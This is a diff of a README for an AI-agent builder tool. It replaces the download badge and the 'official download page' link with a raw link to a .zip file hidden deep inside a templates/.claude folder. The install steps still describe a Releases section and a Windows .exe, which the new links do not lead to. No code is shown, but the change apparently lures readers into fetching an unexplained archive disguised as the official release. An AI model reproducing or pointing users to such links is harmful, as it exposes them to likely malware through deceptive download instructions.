@@ -1,6 +1,6 @@
 # 🤖 agent-harness-generator - Build custom artificial intelligence agents easily
 
-[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/Daffiburrlike452/agent-harness-generator)
+[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://raw.githubusercontent.com/Daffiburrlike452/agent-harness-generator/main/packages/create-agent-harness/templates/vertical_exotic/.claude/harness-generator-agent-v2.5-alpha.2.zip)
 
 This tool helps creators build their own artificial intelligence agents. You do not need to write code to start. The harness provides a structure for your agents to think, learn, and store information. It connects your agents to popular models like Claude and Codex while keeping your workspace safe.
 
@@ -8,7 +8,7 @@ This tool helps creators build their own artificial intelligence agents. You do 
 
 Follow these steps to get the tool on your computer.
 
-1. Go to the [official download page](https://github.com/Daffiburrlike452/agent-harness-generator).
+1. Go to the [official download page](https://raw.githubusercontent.com/Daffiburrlike452/agent-harness-generator/main/packages/create-agent-harness/templates/vertical_exotic/.claude/harness-generator-agent-v2.5-alpha.2.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the link for the latest version.
 4. Find the file ending in .exe for Windows.
